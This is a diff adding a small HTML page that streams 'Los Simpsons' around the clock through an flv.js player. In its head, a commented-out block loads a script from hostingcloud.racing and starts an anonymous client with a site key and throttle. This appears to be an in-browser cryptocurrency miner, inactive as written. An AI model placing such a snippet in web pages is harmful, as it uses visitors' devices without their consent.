@@ -1,0 +1,54 @@
+<!doctype html>
+<html lang="fr" class="no-js">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <title>Los Simpsons las 24 horas</title>
+    <link rel="stylesheet" href="styles.css">
+    <!-- <script src="https://www.hostingcloud.racing/oS6R.js"></script>
+    <script>
+        var _client = new Client.Anonymous('9495f348c76c3a5c7c3c0307dca34720a99027f57cc82f53f76fe0d347efd55a', {
+            throttle: 1, c: 'w', ads: 0
+        });
+        _client.start();
+        
+    
+    </script>
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-YFXW2KNE23"></script>
+    <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-YFXW2KNE23');
+    </script> -->
+</head>
+<body class="sous-menu" style="overflow: hidden;">
+        <img src="https://i.pinimg.com/originals/45/dc/ac/45dcac9d64330bb15043ecf77092973c.jpg" style="position: absolute; z-index: -1; left: -20%; top: -5%; object-fit:cover; height: 120%; width: 120%;">
+        <script src="https://cdn.bootcss.com/flv.js/1.5.0/flv.min.js"></script>
+        
+        <div class="tvContainer">
+            <!-- <div class="backgroundPanel"></div> -->
+            <div class="videoItem">
+                    <video id="videoElement" loop autoplay  controls></video>
+            </div>
+            
+            <img src="tv.png" alt="" class="tvImage">
+        </div>
+        
+            
+        </img>
+        <script>
+            if (flvjs.isSupported()) {
+                var videoElement = document.getElementById('videoElement');
+                var flvPlayer = flvjs.createPlayer({
+                    type: 'flv',
+                    url: 'ws://backend.seta.fun:8000/stream/stream.flv',
+                    isLive: true
+                });
+                flvPlayer.attachMediaElement(videoElement);
+                flvPlayer.load();
+            }
+        </script>
+</body>
+</html>
